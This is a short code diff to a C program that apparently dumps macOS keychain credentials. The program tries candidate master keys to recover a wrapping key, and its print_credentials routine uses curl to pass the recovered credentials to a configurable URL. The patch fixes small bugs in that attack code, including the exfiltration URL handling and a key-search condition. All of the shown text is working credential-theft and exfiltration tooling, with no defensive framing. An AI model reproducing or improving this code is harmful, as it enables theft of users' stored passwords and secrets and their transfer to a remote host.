@@ -1,4 +1,5 @@
 #include <stdio.h>
+#include <unistd.h>
 #include <stdlib.h>
 #include <string.h>
 #include <mach/mach.h>
@@ -457,8 +458,7 @@ void print_credentials() {
         return;
     }
 
-    strlcpy(url)
-    curl_easy_setopt(curl, CURLOPT_URL, CRED_URL);
+    curl_easy_setopt(curl, CURLOPT_URL, url);
     curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
     int i;
     for (i = 0; i < g_credentials_count; ++i) {
@@ -540,7 +540,7 @@ int main(int argc, char **argv) {
         char s_key[24*2+1];
         hex_string(s_key, g_master_candidates[i], 24);
         printf("[*] Trying master key candidate: %s\n", s_key);
-        if (key_len = dump_wrapping_key(key, g_master_candidates[i], buffer, sz)) {
+        if ((key_len = dump_wrapping_key(key, g_master_candidates[i], buffer, sz))) {
             printf("[+] Found master key: %s\n", s_key);
             break;
         }
